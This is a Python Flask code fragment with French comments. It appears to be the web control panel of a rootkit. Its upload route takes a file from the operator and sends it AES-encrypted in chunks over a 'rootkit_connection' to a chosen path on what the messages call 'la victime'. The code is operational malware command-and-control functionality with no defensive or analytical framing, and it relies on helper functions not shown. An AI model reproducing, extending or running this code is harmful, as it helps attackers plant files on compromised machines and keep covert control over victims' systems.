# ---------------------------------- UPLOAD ---------------------------------- #

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if not authenticated:
        return redirect(url_for('login'))

    if request.method == 'POST':
        uploaded_file = request.files.get('file')
        remote_path = request.form.get('remote_path')

        if uploaded_file and remote_path:
            filename = secure_filename(uploaded_file.filename)
            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            uploaded_file.save(local_path)

            try:
                upload_file_encrypted(local_path, remote_path)
                flash(f"✅ Fichier '{filename}' uploadé et transmis à la victime.")
            except Exception as e:
                flash(f"❌ Erreur lors du transfert à la victime : {e}")

    return render_template("upload.html")


def upload_file_encrypted(local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"[!] Le fichier local '{local_path}' n'existe pas.")
        return

    try:
        # Envoi de la commande upload + chemin destination
        send_to_server(rootkit_connection, f"upload {remote_path}")

        # Envoi du fichier chiffré par blocs
        with open(local_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                encrypted = aes_encrypt(chunk)
                rootkit_connection.sendall(encrypted)

        # Marqueur de fin
        rootkit_connection.sendall(b"EOF\n")

        print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")

    except Exception as e:
        print(f"[!] Erreur d'envoi : {e}")